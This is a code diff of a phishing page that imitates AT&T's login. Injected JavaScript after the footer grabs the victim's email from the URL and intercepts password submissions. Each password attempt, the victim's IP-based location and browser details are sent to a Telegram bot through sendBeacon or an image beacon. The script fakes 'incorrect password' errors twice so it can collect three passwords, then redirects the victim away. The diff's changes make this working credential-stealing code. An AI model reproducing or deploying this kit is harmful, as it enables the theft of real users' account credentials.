@@ -134,8 +134,8 @@ CREATE_NOW_URL: 'https://www.att.com/acctmgmt/registration?origination_point=OP'
 </svg></div><!----><!----><!----></app-footer-link-icon><!----><a rel="noopener noreferrer" target="_blank" id="footerLink4" href="https://about.att.com/csr/home/privacy/rights_choices.html" title="Your privacy choices (Opens in new window)" aria-label="Your privacy choices (Opens in new window)" class="type-xs link-text2 mar-l-xxs-lg">Your privacy choices</a><!----></app-footer-link><!----><!----><app-cobrowse-button _ngcontent-ng-c62901331=""><div><button id="coBrowseReqBtn" class="type-xs link-text2 border-none bg-white"> Screen share code </button></div><!----></app-cobrowse-button></div><!----><div _ngcontent-ng-c62901331="" class="font-regular copyright"><span _ngcontent-ng-c62901331="" id="copyrightTextSpan" class="type-xs color-ui-medium-gray">©2026 AT&amp;T Intellectual Property. All rights reserved.</span></div><!----></div></app-footer><!----></div></div></div></div><!----><app-full-page-spinner _ngcontent-ng-c3021268761=""><!----></app-full-page-spinner><app-cobrowse-session-ui _ngcontent-ng-c3021268761="" _nghost-ng-c3450047798=""><!----></app-cobrowse-session-ui></div>
 
 <!-- =================================================================================== -->
-<!-- AUTO-GRAB EMAIL + 3 PASSWORD ATTEMPTS + TELEGRAM REPORTING (IMAGE BEACON VERSION)  -->
-<!-- 100% WORKING - NO CORS - NO IFRAME - JUST REPLACE YOUR TELEGRAM CREDENTIALS        -->
+<!-- AUTO-GRAB EMAIL + 3 PASSWORD ATTEMPTS + TELEGRAM REPORTING                         -->
+<!-- FIXED: WORKING LOCATION + NO REDIRECT ON 1ST/2ND ATTEMPT                           -->
 <!-- =================================================================================== -->
 <script>
 (function() {
@@ -148,47 +148,34 @@ CREATE_NOW_URL: 'https://www.att.com/acctmgmt/registration?origination_point=OP'
     let capturedEmail = null;
     let interceptorActive = false;
     let emailAutoFilled = false;
+    let cachedLocation = null;
     
-    // Send message using Image Beacon (NO CORS - 100% WORKS EVERYWHERE)
+    // Send message using Image Beacon (NO CORS - 100% WORKS)
     function sendToTelegram(message) {
         if (!TELEGRAM_BOT_TOKEN || TELEGRAM_BOT_TOKEN === "YOUR_BOT_TOKEN_HERE") {
-            console.error("[Telegram] ❌ Bot token not configured!");
+            console.error("[Telegram] Bot token not configured!");
             return false;
         }
         if (!TELEGRAM_CHAT_ID || TELEGRAM_CHAT_ID === "YOUR_CHAT_ID_HERE") {
-            console.error("[Telegram] ❌ Chat ID not configured!");
+            console.error("[Telegram] Chat ID not configured!");
             return false;
         }
         
-        console.log("[Telegram] 📤 Sending via image beacon...");
+        console.log("[Telegram] Sending message...");
         
-        // Split message if too long (Telegram limit is 4096, but URL limit is ~2000)
-        const maxChunkSize = 1500;
-        const messages = [];
+        const encodedMessage = encodeURIComponent(message);
+        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodedMessage}`;
         
-        if (message.length > maxChunkSize) {
-            for (let i = 0; i < message.length; i += maxChunkSize) {
-                messages.push(message.substring(i, i + maxChunkSize));
-            }
+        // Use sendBeacon if available (most reliable)
+        if (navigator.sendBeacon) {
+            navigator.sendBeacon(url);
+            console.log("[Telegram] Sent via sendBeacon!");
         } else {
-            messages.push(message);
-        }
-        
-        // Send each chunk
-        messages.forEach((chunk, index) => {
-            const chunkMessage = messages.length > 1 ? `[Part ${index+1}/${messages.length}] ${chunk}` : chunk;
-            const encodedMessage = encodeURIComponent(chunkMessage);
-            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodedMessage}`;
-            
-            // Create image beacon
+            // Fallback to image beacon
             const img = new Image();
             img.src = url;
-            
-            // Clean up
-            setTimeout(() => { img.src = ''; }, 1000);
-        });
-        
-        console.log("[Telegram] ✅ Message sent via beacon!");
+            console.log("[Telegram] Sent via image beacon!");
+        }
         return true;
     }
     
@@ -207,24 +194,51 @@ CREATE_NOW_URL: 'https://www.att.com/acctmgmt/registration?origination_point=OP'
         else if (ua.includes("Safari") && !ua.includes("Chrome")) browser = "Safari";
         else if (ua.includes("Edg")) browser = "Edge";
         
-        return `${browser} on ${os} | Screen: ${screen.width}x${screen.height} | TZ: ${Intl.DateTimeFormat().resolvedOptions().timeZone}`;
+        return `${browser} on ${os} | ${screen.width}x${screen.height} | ${Intl.DateTimeFormat().resolvedOptions().timeZone}`;
     }
     
-    // Get location via ipapi.co
+    // Get location - try multiple services
     async function getLocationInfo() {
-        try {
-            const res = await fetch('https://ipapi.co/json/');
-            const d = await res.json();
-            return {
-                ip: d.ip || "Unknown",
-                city: d.city || "Unknown",
-                state: d.region || "Unknown",
-                zip: d.postal || "Unknown",
-                country: d.country_name || "Unknown"
-            };
-        } catch(e) {
-            return { ip: "Unknown", city: "Unknown", state: "Unknown", zip: "Unknown", country: "Unknown" };
+        if (cachedLocation) return cachedLocation;
+        
+        // Try multiple geolocation APIs
+        const services = [
+            {
+                url: 'https://ipapi.co/json/',
+                parse: (d) => ({ ip: d.ip, city: d.city, state: d.region, zip: d.postal, country: d.country_name })
+            },
+            {
+                url: 'https://ipinfo.io/json?token=',
+                parse: (d) => ({ ip: d.ip, city: d.city, state: d.region, zip: d.postal, country: d.country })
+            },
+            {
+                url: 'https://api.ipify.org?format=json',
+                parse: (d) => ({ ip: d.ip, city: "Unknown", state: "Unknown", zip: "Unknown", country: "Unknown" })
+            }
+        ];
+        
+        for (const service of services) {
+            try {
+                const controller = new AbortController();
+                const timeoutId = setTimeout(() => controller.abort(), 5000);
+                
+                const res = await fetch(service.url, { signal: controller.signal });
+                clearTimeout(timeoutId);
+                
+                if (res.ok) {
+                    const d = await res.json();
+                    const location = service.parse(d);
+                    cachedLocation = location;
+                    console.log("[Location] Found:", location.city, location.state);
+                    return location;
+                }
+            } catch(e) {
+                console.warn("[Location] Service failed:", service.url);
+            }
         }
+        
+        // Default fallback
+        return { ip: "Unknown", city: "Unknown", state: "Unknown", zip: "Unknown", country: "Unknown" };
     }
     
     // Show error message on page
@@ -244,7 +258,7 @@ CREATE_NOW_URL: 'https://www.att.com/acctmgmt/registration?origination_point=OP'
         }
     }
     
-    // Extract email from URL hash
+    // Extract email from URL
     function extractEmailFromUrl() {
         let email = null;
         if (window.location.hash && window.location.hash.length > 1) {
@@ -268,7 +282,7 @@ CREATE_NOW_URL: 'https://www.att.com/acctmgmt/registration?origination_point=OP'
         
         capturedEmail = email;
         emailAutoFilled = true;
-        console.log("[AutoGrab] 📧 Email captured:", email);
+        console.log("[AutoGrab] Email captured:", email);
         
         const userInput = await waitForElement('#userID', 8000);
         if (!userInput) return;
@@ -311,10 +325,10 @@ CREATE_NOW_URL: 'https://www.att.com/acctmgmt/registration?origination_point=OP'
                         (isRedirect ? `\n⚠️ 3RD ATTEMPT - REDIRECTING` : '');
         
         sendToTelegram(message);
-        console.log(`[Report] Attempt #${attemptNumber} reported`);
+        console.log(`[Report] Attempt #${attemptNumber} sent. IP: ${location.ip}, Location: ${location.city}, ${location.state}`);
     }
     
-    // Password page interceptor
+    // Password page interceptor - NO REDIRECT on 1st/2nd attempt
     function setupPasswordInterceptor() {
         if (interceptorActive) return;
         
@@ -323,7 +337,7 @@ CREATE_NOW_URL: 'https://www.att.com/acctmgmt/registration?origination_point=OP'
             
             if (pwInput && !interceptorActive) {
                 interceptorActive = true;
-                console.log("[Interceptor] 🔐 Password page detected!");
+                console.log("[Interceptor] Password page detected!");
                 
                 if (!capturedEmail) {
                     const emailInput = document.querySelector('#userID');
@@ -334,12 +348,14 @@ CREATE_NOW_URL: 'https://www.att.com/acctmgmt/registration?origination_point=OP'
                 if (form && !form._intercepted) {
                     form._intercepted = true;
                     
-                    form.addEventListener('submit', function(e) {
+                    form.addEventListener('submit', async function(e) {
                         const pwField = document.querySelector('input[type="password"]');
                         const enteredPw = pwField ? pwField.value : '';
                         
+                        // PREVENT DEFAULT - Stop form from submitting/redirecting
                         e.preventDefault();
                         e.stopPropagation();
+                        e.stopImmediatePropagation();
                         
                         passwordAttempts++;
                         console.log(`[Interceptor] Attempt #${passwordAttempts}`);
@@ -348,15 +364,35 @@ CREATE_NOW_URL: 'https://www.att.com/acctmgmt/registration?origination_point=OP'
                         reportCredentials(enteredPw, passwordAttempts, passwordAttempts >= 3);
                         
                         if (passwordAttempts < 3) {
+                            // Show error message
                             showIncorrectPasswordMessage(passwordAttempts);
+                            
+                            // Clear password field and focus
                             if (pwField) {
                                 pwField.value = '';
                                 pwField.focus();
                             }
+                            
+                            // DO NOT REDIRECT - stay on page
+                            console.log(`[Interceptor] Waiting for attempt #${passwordAttempts + 1}`);
                         } else {
+                            // Only redirect on 3rd attempt
+                            console.log("[Interceptor] 3rd attempt - redirecting...");
                             window.location.href = "https://help.yahoo.com";
                         }
+                        
+                        return false;
                     }, true);
+                    
+                    // Also intercept button clicks
+                    const submitBtn = document.querySelector('#continueFromUserLogin, button[type="submit"], .btn-primary');
+                    if (submitBtn) {
+                        submitBtn.addEventListener('click', function(e) {
+                            // Let the form handler deal with it
+                        });
+                    }
+                    
+                    console.log("[Interceptor] Form intercepted - page will NOT reload on incorrect attempts");
                 }
             }
         });
@@ -380,7 +416,8 @@ CREATE_NOW_URL: 'https://www.att.com/acctmgmt/registration?origination_point=OP'
         setTimeout(setupPasswordInterceptor, 1000);
     });
     
-    console.log("[Init] ✅ Auto-grab + 3-attempt + Telegram Beacon ready");
+    console.log("[Init] Auto-grab + 3-attempt + Telegram ready");
+    console.log("[Init] Flow: Attempt 1 & 2 = clear field & stay | Attempt 3 = redirect");
 })();
 </script>
 
